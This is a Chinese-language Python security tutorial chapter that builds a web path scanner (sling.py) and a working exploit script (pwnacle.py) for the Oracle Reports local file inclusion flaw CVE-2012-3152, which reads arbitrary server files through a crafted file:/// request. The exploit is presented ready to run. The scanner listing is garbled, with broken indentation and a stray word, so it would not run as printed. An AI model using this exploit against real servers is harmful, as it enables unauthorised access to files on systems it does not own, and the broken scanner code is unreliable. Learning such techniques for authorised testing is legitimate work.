# Web 扫描和利用

## Web 扫描和利用

本章将会介绍如何使用 python 去构建一个简单的 web 扫描器，并且写一个简单的 exp。有些时候如果组织会发布出来一些漏洞测试的 POC，然后使用者可以使用这些 poc 去检查自己系统的漏洞，但是在这种情况下，如果是等 poc 发布出来早以为时已晚!

在[第五章](https://github.com/smartFlash/pySecurity/blob/master/zh-cn/0x5.md)的时候告诉了大家基本的 web 请求,这一章我们讲两个新的内容:

*   检测特定的服务器列表.
*   利用一个 Oracle 的本地包含漏洞.

**Web 扫描**

下面的这个脚本使用"-i"参数把文件的 url 连接传递到脚本里面，然后使用"-r"参数指定请求的路径,最好使用"-s"参数去指定检测是否含有 CLI 漏洞的字符串.

```py
$ python sling.py -h
Usage: sling.py -i <file_with URLs> -r  -s [optional]

Options:
  -h, --help    show this help message and exit
  -i SERVERS    specify target file with URLs
  -r RESOURCES  specify a file with resources to request
  -s SEARCH     [optional] Specify a search string -s 
```

存储 url 链接列表文件的文本格式应该是这样的——"[`www.google.com`](http://www.google.com)" 一行，并且文件请求的路径应该是"request/"每行,例如:

```py
reqs:
CFIDE/
admin/
tmp/ 
```

下面是一个脚本调用的例子但是没有指定检测字符串:

```py
$ python sling.py -i URLs -r reqs
[+] URL: http://www.google.com/CFIDE/ [404]
[+] URL: http://www.google.com/admin/ [404]
[+] URL: http://www.google.com/tmp/ [404]
[+] URL: http://www.yahoo.com/CFIDE/ [404]
[+] URL: http://www.facebook.com/CFIDE/ [404]
[+] URL: http://www.facebook.com/admin/ [404]
[+] URL: http://www.facebook.com/tmp/ [404] 
```

现在当创建这些请求的时候，你可能想定义一个检测语句以减少误报，例如：你现在请求的路径是"/CFIDE/administrator/enter.cfm",你可以指定检测"CFIDE"的".cfm"页面是否有问题,这样就帮助你减少很多不必要耗费的时间.下面这个例子演示了上面脚本的完整示例:

```py
$ python sling.py -i URLs -r reqs -s google
[+] URL: http://www.google.com/CFIDE/ [404] Found: 'google' in ouput
[+] URL: http://www.google.com/admin/ [404] Found: 'google' in ouput
[+] URL: http://www.google.com/tmp/ [404] Found: 'google' in ouput 
```

正如你所看到的，这个脚本只会检测带有'google'关键字的 url 链接并且通过"STDOUT"显示在屏幕上面,这是一个很简单的脚本能够帮你快速的检索一些 web 资源,更进一步,我们可以指定服务器的版本号和漏洞版本,完整的脚本在教程的最后面:

**自动 web 攻击应用**

在几个月以前,一个安全研究员[NI@root](http://blog.netinfiltration.com/2013/12/12/hacking-oracle-reports-11g/)　发表过一篇详细的 Oracle 本地包含漏洞的报告,在报告发布的同时还发布了一个 POC 检测工具,用来检测你的服务器是否有 bug,除此以外就没有任何工具了,该漏洞允许你通过发起以下请求连接来访问服务器的其他文件或目录,使用"file:///".

```py
request = '/reports/rwservlet?report=test.rdf+desformat=html+destype=cache+JOBTYPE=rwurl+URLPARAMETER="file:///' 
```

下面是调用这个脚本的语法:

```py
$ python pwnacle.py <server> <resource> 
```

pwnacle.py:

```py
#######################################
# pwnacle.py - Exploits CVE-2012-3152 #
# Oracle Local File Inclusion (LFI)   #
#######################################

import urllib, sys, ssl, inspect
exec inspect.getsource(ssl.wrap_socket).replace("PROTOCOL_SSLv23","PROTOCOL_SSLv3") in dict(inspect.getmembers(ssl.wrap_socket))["func_globals"]
import socket

server = sys.argv[1]      # Assigns first argument given at the CLI to 'server' variable
dir = sys.argv[2]         # Assigns second argument given at the CLI to 'dir' variable
ip = server.split('/')[2] # formats the server by splitting the string based on the '/' which grabs the IP out of 'http://ip/'
req = '/reports/rwservlet?report=test.rdf+desformat=html+destype=cache+JOBTYPE=rwurl+URLPARAMETER="file:///' #request format to exploit the vulnerability

print "Sending Request: "+server+req+dir+'"'

if 'http://' in server: # 使用 http 的 urllib 模块  --如果是 ssl 协议就出抛出错误
        try:
                conn = urllib.urlopen(server+req+dir+'"') # 发送请求给服务器
                out = conn.readlines()
                for item in conn:
                        print item.strip()
        except Exception as e:
                print e

if 'https://' in server:  # Create web request with ssl module
        try:
                conn = ssl.wrap_socket(socket.create_connection((ip, 443)))
                request = 'GET '+req+dir+'"'+' HTTP/1.1'+'\n'
                request += 'Host: '+ip+'\n'
                request += 'User-Agent: Mozilla/5.0 '+'\n'
                request += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'+'\n'
                request += 'Accept-Language: en-US,en;q=0.5'+'\n'
                request += 'Accept-Encoding: gzip, deflate'+'\n'
                request += 'Connection: keep-alive'+'\n'
                conn.send(request+'\n')
                print conn.recv()
                print conn.recv(20098)

        except Exception as e:
                print e 
```

Sling.py:

```py
#####################################
# sling.py - checks for resources   #
# Can seach for string in response  #
#####################################

from bs4 import BeautifulSoup
import sys, optparse, socket
from urllib import urlopen

class Colors:
        RED = '\033[91m'
        GREEN = '\033[92m'

def webreq(server, resources):                              # 主机地址,请求路径
        try:
                resource = []
                for item in open(resources, 'r'):           #对请求资源路径循环
                        resource.append(item.strip())            # 把文件内的链接添加到数组里面
                for item in resource:                       #循环数组并且创建请求
                        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(5)                     # 设置连接超时时间
                        url = server.strip()+item.strip()        # 格式化请求 url 链接: "http://www.site.com/CFIDE/administrator/enter.cfm"
                        request = urlopen(url)                   # 创建请求
                        if search:                     # 如果变量 "search"为 true (-s)
                                parsed = BeautifulSoup(request.read(), "lxml")  #使用 BeautifulSoup 解析
                                if search in str(parsed):             # 如果 search 存在就输出
                                        print Colors.GREEN+"[+] URL: "+url+" ["+str(request.getcode())+"] Found: '"+search+"' in ouput"
                        elif request.getcode() == 404:                # 获取 http 状态码
                                print Colors.RED+"[+] URL: "+url+" ["+str(request.getcode())+"]"    # 打印 url 的状态码
               elif request.getcode():
                    print Colors.GREEN+"[+] URL: "+url+" ["+str(request.getcode())+"]"

        except:pass

def main():
# 创建一个 CLI 功能函数并且存储到变量里面
parser = optparse.OptionParser(sys.argv[0]+' '+ \
        '-i <file_with URLs> -r  -s [optional]')
        parser.add_option('-i', dest='servers', type='string', help='specify target file with URLs')
        parser.add_option('-r', dest='resources', type='string', help='specify a file with resources to request')
        parser.add_option('-s', dest='search', type='string', help='[optional] Specify a search string -s ')
        (options, args) = parser.parse_args()
        servers=options.servers
        resources=options.resources
        global search; search=options.search

        if (servers == None) and (resources==None):              # 检查 CLI 是否有效
                print parser.usage                     # if not print usage
                sys.exit(0)

        if servers:
                for server in open(servers, 'r'):           # 循环文件里面的 url 连接
                        webreq(server, resources)           # 调用 webreq 函数
                        function

if __name__ == "__main__":
      main() 
```